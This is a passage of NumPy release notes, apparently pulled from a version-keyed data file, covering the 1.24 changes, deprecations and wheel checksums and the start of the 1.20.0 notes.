SIGNATURE-----\n\niQEcBAEBAgAGBQJcO/U7AAoJEGefIoN3xSR7hAwH/03g71NpxgBWq9EX5QMwhR9G\nIrlDTxCs7wfiQiYvKbwe6gmEQojO7uQW3lWK5Pb+Tl/h2QeIMKjN3nZK823ifc6D\nKPyliXNYb5p+iFNEoLcYcyuusWt6+3dWSI2QV+iKnxPyFA647m/u8IhsPfMuC/F2\nUzltB13Y2Le63bl+Vc5IYpr5HgILZGnp+O46lgm0YuBDgyh3R8qajV+tpuRxwVBo\nh6aTwEQJGwIuygPdMvmnbnBlNZF2luZ0poAFeUeuMjbSXQgsNwTJyCEFJTnCbiLi\nWx4a8GXajvtyBcHzO8NKwrd5xZTcQnI5RTFiC7wTVXqtWBQab0WodTY7FD6/uRY=\n=AC5i\n-----END PGP SIGNATURE-----\n\n\n.. currentmodule:: numpy\n\n========================\nNumPy 1.24 Release Notes\n========================\nThe NumPy 1.24.0 release continues the ongoing work to improve the handling and\npromotion of dtypes, increase the execution speed, and clarify the\ndocumentation.  There are also a large number of new and expired deprecations\ndue to changes in promotion and cleanups. This might be called a deprecation\nrelease. Highlights are\n\n* Many new deprecations, check them out.\n* Many expired deprecations,\n* New F2PY features and fixes.\n* New \"dtype\" and \"casting\" keywords for stacking functions.\n\nSee below for the details,\n\n\nDeprecations\n============\n\nDeprecate fastCopyAndTranspose and PyArray_CopyAndTranspose\n-----------------------------------------------------------\nThe ``numpy.fastCopyAndTranspose`` function has been deprecated. Use the\ncorresponding copy and transpose methods directly::\n\n    arr.T.copy()\n\nThe underlying C function ``PyArray_CopyAndTranspose`` has also been deprecated\nfrom the NumPy C-API.\n\n(`gh-22313 <https://github.com/numpy/numpy/pull/22313>`__)\n\nConversion of out-of-bound Python integers\n------------------------------------------\nAttempting a conversion from a Python integer to a NumPy value will now always\ncheck whether the result can be represented by NumPy.  This means the following\nexamples will fail in the future and give a ``DeprecationWarning`` now::\n\n    np.uint8(-1)\n    np.array([3000], dtype=np.int8)\n\nMany of these did succeed before.  Such code was mainly useful for unsigned\nintegers with negative values such as ``np.uint8(-1)`` giving\n``np.iinfo(np.uint8).max``.\n\nNote that conversion between NumPy integers is unaffected, so that\n``np.array(-1).astype(np.uint8)`` continues to work and use C integer overflow\nlogic.\n\n(`gh-22393 <https://github.com/numpy/numpy/pull/22393>`__)\n\nDeprecate ``msort``\n-------------------\nThe ``numpy.msort`` function is deprecated. Use ``np.sort(a, axis=0)`` instead.\n\n(`gh-22456 <https://github.com/numpy/numpy/pull/22456>`__)\n\n``np.str0`` and similar are now deprecated\n------------------------------------------\nThe scalar type aliases ending in a 0 bit size: ``np.object0``, ``np.str0``,\n``np.bytes0``, ``np.void0``, ``np.int0``, ``np.uint0`` as well as ``np.bool8``\nare now deprecated and will eventually be removed.\n\n(`gh-22607 <https://github.com/numpy/numpy/pull/22607>`__)\n\n\nExpired deprecations\n====================\n\n* The ``normed`` keyword argument has been removed from\n  `np.histogram`, `np.histogram2d`, and `np.histogramdd`.\n  Use ``density`` instead.  If ``normed`` was passed by\n  position, ``density`` is now used.\n\n  (`gh-21645 <https://github.com/numpy/numpy/pull/21645>`__)\n\n* Ragged array creation will now always raise a ``ValueError`` unless\n  ``dtype=object`` is passed.  This includes very deeply nested sequences.\n\n  (`gh-22004 <https://github.com/numpy/numpy/pull/22004>`__)\n\n* Support for Visual Studio 2015 and earlier has been removed.\n\n* Support for the Windows Interix POSIX interop layer has been removed.\n\n  (`gh-22139 <https://github.com/numpy/numpy/pull/22139>`__)\n\n* Support for cygwin < 3.3 has been removed.\n\n  (`gh-22159 <https://github.com/numpy/numpy/pull/22159>`__)\n\n* The mini() method of ``np.ma.MaskedArray`` has been removed. Use either\n  ``np.ma.MaskedArray.min()`` or ``np.ma.minimum.reduce()``.\n\n* The single-argument form of ``np.ma.minimum`` and ``np.ma.maximum`` has been\n  removed. Use ``np.ma.minimum.reduce()`` or ``np.ma.maximum.reduce()``\n  instead.\n\n  (`gh-22228 <https://github.com/numpy/numpy/pull/22228>`__)\n\n* Passing dtype instances other than the canonical (mainly native byte-order)\n  ones to ``dtype=`` or ``signature=`` in ufuncs will now raise a\n  ``TypeError``.  We recommend passing the strings ``\"int8\"`` or scalar types\n  ``np.int8`` since the byte-order, datetime/timedelta unit, etc. are never\n  enforced.  (Initially deprecated in NumPy 1.21.)\n\n  (`gh-22540 <https://github.com/numpy/numpy/pull/22540>`__)\n\n* The ``dtype=`` argument to comparison ufuncs is now applied correctly.  That\n  means that only ``bool`` and ``object`` are valid values and ``dtype=object``\n  is enforced.\n\n  (`gh-22541 <https://github.com/numpy/numpy/pull/22541>`__)\n\n* The deprecation for the aliases ``np.object``, ``np.bool``, ``np.float``,\n  ``np.complex``, ``np.str``, and ``np.int`` is expired (introduces NumPy\n  1.20).  Some of these will now give a FutureWarning in addition to raising an\n  error since they will be mapped to the NumPy scalars in the future.\n\n  (`gh-22607 <https://github.com/numpy/numpy/pull/22607>`__)\n\n\nCompatibility notes\n===================\n\n``array.fill(scalar)`` may behave slightly different\n----------------------------------------------------\n``numpy.ndarray.fill`` may in some cases behave slightly different now due to\nthe fact that the logic is aligned with item assignment::\n\n    arr = np.array([1])   with any dtype/value\n    arr.fill(scalar)\n     is now identical to:\n    arr[0] = scalar\n\nPreviously casting may have produced slightly different answers when using\nvalues that could not be represented in the target ``dtype`` or when the target\nhad ``object`` dtype.\n\n(`gh-20924 <https://github.com/numpy/numpy/pull/20924>`__)\n\nSubarray to object cast now copies\n----------------------------------\nCasting a dtype that includes a subarray to an object will now ensure a copy of\nthe subarray.  Previously an unsafe view was returned::\n\n    arr = np.ones(3, dtype=[(\"f\", \"i\", 3)])\n    subarray_fields = arr.astype(object)[0]\n    subarray = subarray_fields[0]   \"f\" field\n\n    np.may_share_memory(subarray, arr)\n\nIs now always false.  While previously it was true for the specific cast.\n\n(`gh-21925 <https://github.com/numpy/numpy/pull/21925>`__)\n\nReturned arrays respect uniqueness of dtype kwarg objects\n---------------------------------------------------------\nWhen the ``dtype`` keyword argument is used with :py:func:`np.array()` or\n:py:func:`asarray()`, the dtype of the returned array now always exactly\nmatches the dtype provided by the caller.\n\nIn some cases this change means that a *view* rather than the input array is\nreturned.  The following is an example for this on 64bit Linux where ``long``\nand ``longlong`` are the same precision but different ``dtypes``::\n\n    >>> arr = np.array([1, 2, 3], dtype=\"long\")\n    >>> new_dtype = np.dtype(\"longlong\")\n    >>> new = np.asarray(arr, dtype=new_dtype)\n    >>> new.dtype is new_dtype\n    True\n    >>> new is arr\n    False\n\nBefore the change, the ``dtype`` did not match because ``new is arr`` was\n``True``.\n\n(`gh-21995 <https://github.com/numpy/numpy/pull/21995>`__)\n\nDLPack export raises ``BufferError``\n------------------------------------\nWhen an array buffer cannot be exported via DLPack a ``BufferError`` is now\nalways raised where previously ``TypeError`` or ``RuntimeError`` was raised.\nThis allows falling back to the buffer protocol or ``__array_interface__`` when\nDLPack was tried first.\n\n(`gh-22542 <https://github.com/numpy/numpy/pull/22542>`__)\n\nNumPy builds are no longer tested on GCC-6\n------------------------------------------\nUbuntu 18.04 is deprecated for GitHub actions and GCC-6 is not available on\nUbuntu 20.04, so builds using that compiler are no longer tested. We still test\nbuilds using GCC-7 and GCC-8.\n\n(`gh-22598 <https://github.com/numpy/numpy/pull/22598>`__)\n\n\nNew Features\n============\n\nNew attribute ``symbol`` added to polynomial classes\n----------------------------------------------------\nThe polynomial classes in the ``numpy.polynomial`` package have a new\n``symbol`` attribute which is used to represent the indeterminate of the\npolynomial.  This can be used to change the value of the variable when\nprinting::\n\n    >>> P_y = np.polynomial.Polynomial([1, 0, -1], symbol=\"y\")\n    >>> print(P_y)\n    1.0 + 0.0\u00b7y\u00b9 - 1.0\u00b7y\u00b2\n\nNote that the polynomial classes only support 1D polynomials, so operations\nthat involve polynomials with different symbols are disallowed when the result\nwould be multivariate::\n\n    >>> P = np.polynomial.Polynomial([1, -1])   default symbol is \"x\"\n    >>> P_z = np.polynomial.Polynomial([1, 1], symbol=\"z\")\n    >>> P * P_z\n    Traceback (most recent call last)\n       ...\n    ValueError: Polynomial symbols differ\n\nThe symbol can be any valid Python identifier. The default is ``symbol=x``,\nconsistent with existing behavior.\n\n(`gh-16154 <https://github.com/numpy/numpy/pull/16154>`__)\n\nF2PY support for Fortran ``character`` strings\n----------------------------------------------\nF2PY now supports wrapping Fortran functions with:\n\n* character (e.g. ``character x``)\n* character array (e.g. ``character, dimension(n) :: x``)\n* character string (e.g. ``character(len=10) x``)\n* and character string array (e.g. ``character(len=10), dimension(n, m) :: x``)\n\narguments, including passing Python unicode strings as Fortran character string\narguments.\n\n(`gh-19388 <https://github.com/numpy/numpy/pull/19388>`__)\n\nNew function ``np.show_runtime``\n--------------------------------\nA new function ``numpy.show_runtime`` has been added to display the runtime\ninformation of the machine in addition to ``numpy.show_config`` which displays\nthe build-related information.\n\n(`gh-21468 <https://github.com/numpy/numpy/pull/21468>`__)\n\n``strict`` option for ``testing.assert_array_equal``\n----------------------------------------------------\nThe ``strict`` option is now available for ``testing.assert_array_equal``.\nSetting ``strict=True`` will disable the broadcasting behaviour for scalars and\nensure that input arrays have the same data type.\n\n(`gh-21595 <https://github.com/numpy/numpy/pull/21595>`__)\n\nNew parameter ``equal_nan`` added to ``np.unique``\n--------------------------------------------------\n``np.unique`` was changed in 1.21 to treat all ``NaN`` values as equal and\nreturn a single ``NaN``. Setting ``equal_nan=False`` will restore pre-1.21\nbehavior to treat ``NaNs`` as unique. Defaults to ``True``.\n\n(`gh-21623 <https://github.com/numpy/numpy/pull/21623>`__)\n\n``casting`` and ``dtype`` keyword arguments for ``numpy.stack``\n---------------------------------------------------------------\nThe ``casting`` and ``dtype`` keyword arguments are now available for\n``numpy.stack``.  To use them, write ``np.stack(..., dtype=None,\ncasting='same_kind')``.\n\n``casting`` and ``dtype`` keyword arguments for ``numpy.vstack``\n----------------------------------------------------------------\nThe ``casting`` and ``dtype`` keyword arguments are now available for\n``numpy.vstack``.  To use them, write ``np.vstack(..., dtype=None,\ncasting='same_kind')``.\n\n``casting`` and ``dtype`` keyword arguments for ``numpy.hstack``\n----------------------------------------------------------------\nThe ``casting`` and ``dtype`` keyword arguments are now available for\n``numpy.hstack``.  To use them, write ``np.hstack(..., dtype=None,\ncasting='same_kind')``.\n\n(`gh-21627 <https://github.com/numpy/numpy/pull/21627>`__)\n\nThe bit generator underlying the singleton RandomState can be changed\n---------------------------------------------------------------------\nThe singleton ``RandomState`` instance exposed in the ``numpy.random`` module\nis initialized at startup with the ``MT19937`` bit generator. The new function\n``set_bit_generator`` allows the default bit generator to be replaced with a\nuser-provided bit generator. This function has been introduced to provide a\nmethod allowing seamless integration of a high-quality, modern bit generator in\nnew code with existing code that makes use of the singleton-provided random\nvariate generating functions. The companion function ``get_bit_generator``\nreturns the current bit generator being used by the singleton ``RandomState``.\nThis is provided to simplify restoring the original source of randomness if\nrequired.\n\nThe preferred method to generate reproducible random numbers is to use a modern\nbit generator in an instance of ``Generator``. The function ``default_rng``\nsimplifies instantiation::\n\n   >>> rg = np.random.default_rng(3728973198)\n   >>> rg.random()\n\nThe same bit generator can then be shared with the singleton instance so that\ncalling functions in the ``random`` module will use the same bit generator::\n\n   >>> orig_bit_gen = np.random.get_bit_generator()\n   >>> np.random.set_bit_generator(rg.bit_generator)\n   >>> np.random.normal()\n\nThe swap is permanent (until reversed) and so any call to functions in the\n``random`` module will use the new bit generator. The original can be restored\nif required for code to run correctly::\n\n   >>> np.random.set_bit_generator(orig_bit_gen)\n\n(`gh-21976 <https://github.com/numpy/numpy/pull/21976>`__)\n\n``np.void`` now has a ``dtype`` argument\n----------------------------------------\nNumPy now allows constructing structured void scalars directly by\npassing the ``dtype`` argument to ``np.void``.\n\n(`gh-22316 <https://github.com/numpy/numpy/pull/22316>`__)\n\n\nImprovements\n============\n\nF2PY Improvements\n-----------------\n* The generated extension modules don't use the deprecated NumPy-C API anymore\n* Improved ``f2py`` generated exception messages\n* Numerous bug and ``flake8`` warning fixes\n* various CPP macros that one can use within C-expressions of signature files\n  are prefixed with ``f2py_``. For example, one should use ``f2py_len(x)``\n  instead of ``len(x)``\n* A new construct ``character(f2py_len=...)`` is introduced to support\n  returning assumed length character strings (e.g. ``character(len=*)``) from\n  wrapper functions\n\nA hook to support rewriting ``f2py`` internal data structures after reading all\nits input files is introduced. This is required, for instance, for BC of SciPy\nsupport where character arguments are treated as character strings arguments in\n``C`` expressions.\n\n(`gh-19388 <https://github.com/numpy/numpy/pull/19388>`__)\n\nIBM zSystems Vector Extension Facility (SIMD)\n---------------------------------------------\nAdded support for SIMD extensions of zSystem (z13, z14, z15), through the\nuniversal intrinsics interface. This support leads to performance improvements\nfor all SIMD kernels implemented using the universal intrinsics, including the\nfollowing operations: rint, floor, trunc, ceil, sqrt, absolute, square,\nreciprocal, tanh, sin, cos, equal, not_equal, greater, greater_equal, less,\nless_equal, maximum, minimum, fmax, fmin, argmax, argmin, add, subtract,\nmultiply, divide.\n\n(`gh-20913 <https://github.com/numpy/numpy/pull/20913>`__)\n\nNumPy now gives floating point errors in casts\n----------------------------------------------\nIn most cases, NumPy previously did not give floating point warnings or errors\nwhen these happened during casts.  For examples, casts like::\n\n    np.array([2e300]).astype(np.float32)   overflow for float32\n    np.array([np.inf]).astype(np.int64)\n\nShould now generally give floating point warnings.  These warnings should warn\nthat floating point overflow occurred.  For errors when converting floating\npoint values to integers users should expect invalid value warnings.\n\nUsers can modify the behavior of these warnings using ``np.errstate``.\n\nNote that for float to int casts, the exact warnings that are given may\nbe platform dependent.  For example::\n\n    arr = np.full(100, value=1000, dtype=np.float64)\n    arr.astype(np.int8)\n\nMay give a result equivalent to (the intermediate cast means no warning is\ngiven)::\n\n    arr.astype(np.int64).astype(np.int8)\n\nMay return an undefined result, with a warning set::\n\n    RuntimeWarning: invalid value encountered in cast\n\nThe precise behavior is subject to the C99 standard and its implementation in\nboth software and hardware.\n\n(`gh-21437 <https://github.com/numpy/numpy/pull/21437>`__)\n\nF2PY supports the value attribute\n---------------------------------\nThe Fortran standard requires that variables declared with the ``value``\nattribute must be passed by value instead of reference. F2PY now supports this\nuse pattern correctly. So ``integer, intent(in), value :: x`` in Fortran codes\nwill have correct wrappers generated.\n\n(`gh-21807 <https://github.com/numpy/numpy/pull/21807>`__)\n\nAdded pickle support for third-party BitGenerators\n--------------------------------------------------\nThe pickle format for bit generators was extended to allow each bit generator\nto supply its own constructor when during pickling. Previous  versions of NumPy\nonly supported unpickling ``Generator`` instances created with one of the core\nset of bit generators supplied with NumPy. Attempting to unpickle a\n``Generator`` that used a third-party bit generators would fail since the\nconstructor used during the unpickling was only aware of the bit generators\nincluded in NumPy.\n\n(`gh-22014 <https://github.com/numpy/numpy/pull/22014>`__)\n\narange() now explicitly fails with dtype=str\n---------------------------------------------\nPreviously, the ``np.arange(n, dtype=str)`` function worked for ``n=1`` and\n``n=2``, but would raise a non-specific exception message for other values of\n``n``. Now, it raises a `TypeError` informing that ``arange`` does not support\nstring dtypes::\n\n    >>> np.arange(2, dtype=str)\n    Traceback (most recent call last)\n       ...\n    TypeError: arange() not supported for inputs with DType <class 'numpy.dtype[str_]'>.\n\n(`gh-22055 <https://github.com/numpy/numpy/pull/22055>`__)\n\n``numpy.typing`` protocols are now runtime checkable\n----------------------------------------------------\nThe protocols used in ``numpy.typing.ArrayLike`` and ``numpy.typing.DTypeLike``\nare now properly marked as runtime checkable, making them easier to use for\nruntime type checkers.\n\n(`gh-22357 <https://github.com/numpy/numpy/pull/22357>`__)\n\n\nPerformance improvements and changes\n====================================\n\nFaster version of ``np.isin`` and ``np.in1d`` for integer arrays\n----------------------------------------------------------------\n``np.in1d`` (used by ``np.isin``) can now switch to a faster algorithm (up to\n>10x faster) when it is passed two integer arrays.  This is often automatically\nused, but you can use ``kind=\"sort\"`` or ``kind=\"table\"`` to force the old or\nnew method, respectively.\n\n(`gh-12065 <https://github.com/numpy/numpy/pull/12065>`__)\n\nFaster comparison operators\n----------------------------\nThe comparison functions (``numpy.equal``, ``numpy.not_equal``, ``numpy.less``,\n``numpy.less_equal``, ``numpy.greater`` and ``numpy.greater_equal``) are now\nmuch faster as they are now vectorized with universal intrinsics. For a CPU\nwith SIMD extension AVX512BW, the performance gain is up to 2.57x, 1.65x and\n19.15x for integer, float and boolean data types, respectively (with N=50000).\n\n(`gh-21483 <https://github.com/numpy/numpy/pull/21483>`__)\n\n\nChanges\n=======\n\nBetter reporting of integer division overflow\n---------------------------------------------\nInteger division overflow of scalars and arrays used to provide a\n``RuntimeWarning`` and the return value was undefined leading to crashes at\nrare occasions::\n\n    >>> np.array([np.iinfo(np.int32).min]*10, dtype=np.int32) // np.int32(-1)\n    <stdin>:1: RuntimeWarning: divide by zero encountered in floor_divide\n    array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0], dtype=int32)\n\nInteger division overflow now returns the input dtype's minimum value and raise\nthe following ``RuntimeWarning``::\n\n    >>> np.array([np.iinfo(np.int32).min]*10, dtype=np.int32) // np.int32(-1)\n    <stdin>:1: RuntimeWarning: overflow encountered in floor_divide\n    array([-2147483648, -2147483648, -2147483648, -2147483648, -2147483648,\n           -2147483648, -2147483648, -2147483648, -2147483648, -2147483648],\n          dtype=int32)\n\n(`gh-21506 <https://github.com/numpy/numpy/pull/21506>`__)\n\n``masked_invalid`` now modifies the mask in-place\n-------------------------------------------------\nWhen used with ``copy=False``, ``numpy.ma.masked_invalid`` now modifies the\ninput masked array in-place.  This makes it behave identically to\n``masked_where`` and better matches the documentation.\n\n(`gh-22046 <https://github.com/numpy/numpy/pull/22046>`__)\n\n``nditer``/``NpyIter`` allows all allocating all operands\n---------------------------------------------------------\nThe NumPy iterator available through ``np.nditer`` in Python and as ``NpyIter``\nin C now supports allocating all arrays.  The iterator shape defaults to ``()``\nin this case.  The operands dtype must be provided, since a \"common dtype\"\ncannot be inferred from the other inputs.\n\n(`gh-22457 <https://github.com/numpy/numpy/pull/22457>`__)\n\nChecksums\n=========\n\nMD5\n---\n::\n\n    1f08c901040ebe1324d16cfc71fe3cd2  numpy-1.24.0rc1-cp310-cp310-macosx_10_9_x86_64.whl\n    d35a59a1ccf1542d690860ad85fbb0f0  numpy-1.24.0rc1-cp310-cp310-macosx_11_0_arm64.whl\n    c7db37964986d7b9756fd1aa077b7e72  numpy-1.24.0rc1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    72c2dad61fc86c4d87e23d0de975e0b6  numpy-1.24.0rc1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    3c769f1089253266d7a522144696bde3  numpy-1.24.0rc1-cp310-cp310-win32.whl\n    96226a2045063b9caff40fe2a2098e72  numpy-1.24.0rc1-cp310-cp310-win_amd64.whl\n    b20897446f52e7fcde80e12c7cc1dc1e  numpy-1.24.0rc1-cp311-cp311-macosx_10_9_x86_64.whl\n    9cafe21759e90c705533d1f3201d35aa  numpy-1.24.0rc1-cp311-cp311-macosx_11_0_arm64.whl\n    0e8621d07dae7ffaba6cfe83f7288042  numpy-1.24.0rc1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    0c67808eed6ba6f9e9074e6f11951f09  numpy-1.24.0rc1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    1065bea5d0670360353e698093954e35  numpy-1.24.0rc1-cp311-cp311-win32.whl\n    fe2122ec86b45e00b648071ee2931fbc  numpy-1.24.0rc1-cp311-cp311-win_amd64.whl\n    ab3e8424a04338d43ed466ade66de7a8  numpy-1.24.0rc1-cp38-cp38-macosx_10_9_x86_64.whl\n    fc6eac08a59c4efb3962d990ff94f2b7  numpy-1.24.0rc1-cp38-cp38-macosx_11_0_arm64.whl\n    3498ac93ae6abba813e5d76f86ae5356  numpy-1.24.0rc1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    629ce4b8cb011ff735ebd482fbf51702  numpy-1.24.0rc1-cp38-cp38-win32.whl\n    cb503a78e27f0f46b6b43d211275dc58  numpy-1.24.0rc1-cp38-cp38-win_amd64.whl\n    ffccdb9750336f5e55ab90c8eb7c1a8d  numpy-1.24.0rc1-cp39-cp39-macosx_10_9_x86_64.whl\n    9751b9f833238a7309ad4e6b43fa8cb5  numpy-1.24.0rc1-cp39-cp39-macosx_11_0_arm64.whl\n    cb8a10f411773f0ac5e06df067599d45  numpy-1.24.0rc1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    8d670816134824972afb512498b95ede  numpy-1.24.0rc1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    60687b97ab720f6be9e3542e5761769f  numpy-1.24.0rc1-cp39-cp39-win32.whl\n    11fd99748acc0726ac164034c32bb3cd  numpy-1.24.0rc1-cp39-cp39-win_amd64.whl\n    09e1d6f6d75facaf84d2b87a33874d4b  numpy-1.24.0rc1-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    2da9ad07343b410aca4edf1285e4266b  numpy-1.24.0rc1-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    9a0e466a55632cc1d67db119f586cd05  numpy-1.24.0rc1-pp38-pypy38_pp73-win_amd64.whl\n    abc863895b02cdcc436474f6cdf2d14d  numpy-1.24.0rc1.tar.gz\n\nSHA256\n------\n::\n\n    36acf6043b94a0e8af75d0a1931678d20e673b83fd79798c805ebc995e233cff  numpy-1.24.0rc1-cp310-cp310-macosx_10_9_x86_64.whl\n    244c2c22f776e168e1060112f87717d73df2462e0eba4095a7673fe87db49b7a  numpy-1.24.0rc1-cp310-cp310-macosx_11_0_arm64.whl\n    730112e692c165e8ad69071c70653522ee19d8c8af2da839339de01013eeef24  numpy-1.24.0rc1-cp310-cp310-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    960b0d980adfa5c37fea89fc556bb482f9d957a3188be46d03a00fa1bd8f617b  numpy-1.24.0rc1-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    f54788f1a6941cb1b57bcf5ff09a281e5db75bbf9f2ac9534a626128ded0244f  numpy-1.24.0rc1-cp310-cp310-win32.whl\n    07fef63a5113969d7897589928870c57dd3e28671d617f688486f12c3a3b466a  numpy-1.24.0rc1-cp310-cp310-win_amd64.whl\n    aea88e02d9335052172f4d6c8163721c3edd086ea3bf3bc9b6d5c55661540f1b  numpy-1.24.0rc1-cp311-cp311-macosx_10_9_x86_64.whl\n    3950be11c03d250ea780280ce37a6fe7bd21dafcb478e08190c72b6c58ed7d18  numpy-1.24.0rc1-cp311-cp311-macosx_11_0_arm64.whl\n    743c30cda228f8be9fe552453870b412b38ac232972c617a0f18765dedf395a5  numpy-1.24.0rc1-cp311-cp311-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    cab1335b70e24e88ef2b9f727b9f5fc6e0d31d9fe9da0213f6c28cf615b65db0  numpy-1.24.0rc1-cp311-cp311-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    5283759f0dd905f9e62ed55775345fbb233a53146ceaf2f75e96d939f564ee79  numpy-1.24.0rc1-cp311-cp311-win32.whl\n    427bd9c45777e8baf782b6b33ebc26a88716c2d9b76b0474987660c2c066dca0  numpy-1.24.0rc1-cp311-cp311-win_amd64.whl\n    20edfad312395d1cb8ad6ca5d2c42d2dab057f5d1920af3f94c7a72103335d8a  numpy-1.24.0rc1-cp38-cp38-macosx_10_9_x86_64.whl\n    79134b92e1fb86915369753b3e64a359416cd98ea2329d270eb4e1d0ab300c0d  numpy-1.24.0rc1-cp38-cp38-macosx_11_0_arm64.whl\n    6f00858573e2316ac5d190cf81dc178d94579969f827ac34c7a53110428e6f72  numpy-1.24.0rc1-cp38-cp38-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    a8d6f78be3ad0bd9b4adecba2fda570ef491ae69f8c7cc84acd382802a81e242  numpy-1.24.0rc1-cp38-cp38-win32.whl\n    f1f5fa912df64dd48ec55352b72f4b036ab7b3911e996703f436e17baca780f9  numpy-1.24.0rc1-cp38-cp38-win_amd64.whl\n    8d149b3c3062dc68e29bdb244edc30c5d80e2c654b5c27c32773bf7354452b48  numpy-1.24.0rc1-cp39-cp39-macosx_10_9_x86_64.whl\n    d177fbd4d22248640d73f07c3aac2cc1f79c412f61564452abd08606ee5e3713  numpy-1.24.0rc1-cp39-cp39-macosx_11_0_arm64.whl\n    05faa4ecb98d7bc593afc5b10c25f0e7dd65244b653756b083c605fbf60b9b67  numpy-1.24.0rc1-cp39-cp39-manylinux_2_17_aarch64.manylinux2014_aarch64.whl\n    06d8827c6fa511b61047376efc3a677d447193bf88e6bbde35b4e5223a4b58d6  numpy-1.24.0rc1-cp39-cp39-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    15605b92bf10b10e110a9c0f1c4ef6cd58246532c62a0c3d3188c05e69cdcdb6  numpy-1.24.0rc1-cp39-cp39-win32.whl\n    8046f5c23769791be8432a592b9881984e0e4abc7f552c7e5c349420a27323e7  numpy-1.24.0rc1-cp39-cp39-win_amd64.whl\n    aa9c4a2f65d669e6559123154da944ad6bd7605cbba5cce81bf6794617870510  numpy-1.24.0rc1-pp38-pypy38_pp73-macosx_10_9_x86_64.whl\n    e44fd1bdfa50979ddec76318e21abc82ee3858e5f45dfc5153b6f660d9d29851  numpy-1.24.0rc1-pp38-pypy38_pp73-manylinux_2_17_x86_64.manylinux2014_x86_64.whl\n    1802199d70d9f8ac11eb63a1ef50d33915b78a84bacacaadb2896175005103d4  numpy-1.24.0rc1-pp38-pypy38_pp73-win_amd64.whl\n    d601180710004799acb8f80e564b84e71490fac9d84e115e2f5b0f6709754f16  numpy-1.24.0rc1.tar.gz\n\n\n.. currentmodule:: numpy\n\n==========================\n", "1.20.0": "==========================\nThis NumPy release is the largest so made to date, some 684 PRs contributed by\n184 people have been merged. See the list of highlights below for more details.\nThe Python versions supported for this release are 3.7-3.9, support for Python\n3.6 has been dropped. Highlights are\n\n- Annotations for NumPy functions. This work is ongoing and improvements can\n  be expected pending feedback from users.\n\n- Wider use of SIMD to increase execution speed of ufuncs. Much work has been\n  done in introducing universal functions that will ease use of modern\n  features across different hardware platforms. This work is ongoing.\n\n- Preliminary work in changing the dtype and casting implementations in order to\n  provide an easier path to extending dtypes. This work is ongoing but enough\n  has been done to allow experimentation and feedback.\n\n- Extensive documentation improvements comprising some 185 PR merges. This work\n  is ongoing and part of the larger project to improve NumPy's online presence\n  and usefulness to new users.\n\n- Further cleanups related to removing Python 2.7. This improves code\n  readability and removes technical debt.\n\n- Preliminary support for the upcoming Cython 3.0.\n\n\nNew functions\n=============\n\nThe random.Generator class has a new ``permuted`` function.\n-----------------------------------------------------------\nThe new function differs from ``shuffle`` and ``permutation`` in that the\nsubarrays indexed by an axis are permuted rather than the axis being treated as\na separate 1-D array for every combination of the other indexes. For example,\nit is now possible to permute the rows or columns of a 2-D array.\n\n(`gh-15121 <https://github.com/numpy/numpy/pull/15121>`__)\n\n``sliding_window_view`` provides a sliding window view for numpy arrays\n-----------------------------------------------------------------------\n`numpy.lib.stride_tricks.sliding_window_view` constructs views on numpy\narrays that offer a sliding or moving window access to the array. This allows\nfor the simple implementation of certain algorithms, such as running means.\n\n(`gh-17394 <https://github.com/numpy/numpy/pull/17394>`__)\n\n`numpy.broadcast_shapes` is a new user-facing function\n------------------------------------------------------\n`~numpy.broadcast_shapes` gets the resulting shape from\nbroadcasting the given shape tuples against each other.\n\n.. code:: python\n\n    >>> np.broadcast_shapes((1, 2), (3, 1))\n    (3, 2)\n\n    >>> np.broadcast_shapes(2, (3, 1))\n    (3, 2)\n\n    >>> np.broadcast_shapes((6, 7), (5, 6, 1), (7,), (5, 1, 7))\n    (5, 6, 7)\n\n(`gh-17535 <https://github.com/numpy/numpy/pull/17535>`__)\n\n\nDeprecations\n============\n\nUsing the aliases of builtin types like ``np.int`` is deprecated\n----------------------------------------------------------------\n\nFor a long time, ``np.int`` has been an alias of the builtin ``int``. This is\nrepeatedly a cause of confusion for newcomers, and existed mainly for historic\nreasons.\n\nThese aliases have been deprecated. The table below shows the full list of\ndeprecated aliases, along with their exact meaning. Replacing uses of items in\nthe first column with the contents of the second column will work identically\nand silence the deprecation warning.\n\nThe third column lists alternative NumPy names which may occasionally be\npreferential. See also :ref:`basics.types` for additional details.\n\n=================  ============  ==================================================================\nDeprecated name    Identical to  NumPy scalar type names\n=================  ============  ==================================================================\n``numpy.bool``     ``bool``      `numpy.bool_`\n``numpy.int``      ``int``       `numpy.int_` (default), ``numpy.int64``, or ``numpy.int32``\n``numpy.float``    ``float``     `numpy.float64`, `numpy.float_`, `numpy.double` (equivalent)\n``numpy.complex``  ``complex``   `numpy.complex128`, `numpy.complex_`, `numpy.cdouble` (equivalent)\n``numpy.object``   ``object``    `numpy.object_`\n``numpy.str``      ``str``       `numpy.str_`\n``numpy.long``     ``int``       `numpy.int_` (C ``long``), `numpy.longlong` (largest integer type)\n``numpy.unicode``  ``str``       `numpy.unicode_`\n=================  ============  ==================================================================\n\nTo give a clear guideline for the vast majority of cases, for the types\n``bool``, ``object``, ``str`` (and ``unicode``) using the plain version\nis shorter and clear, and generally a good replacement.\nFor ``float`` and ``complex`` you can use ``float64`` and ``complex128``\nif you wish to be more explicit about the precision.\n\nFor ``np.int`` a direct replacement with ``np.int_`` or ``int`` is also\ngood and will not change behavior, but the precision will continue to depend\non the computer and operating system.\nIf you want to be more explicit and review the current use, you have the\nfollowing alternatives:\n\n* ``np.int64`` or ``np.int32`` to specify the precision exactly.\n  This ensures that results cannot depend on the computer or operating system.\n* ``np.int_`` or ``int`` (the default), but be aware that it depends on\n  the computer and operating system.\n* The C types: 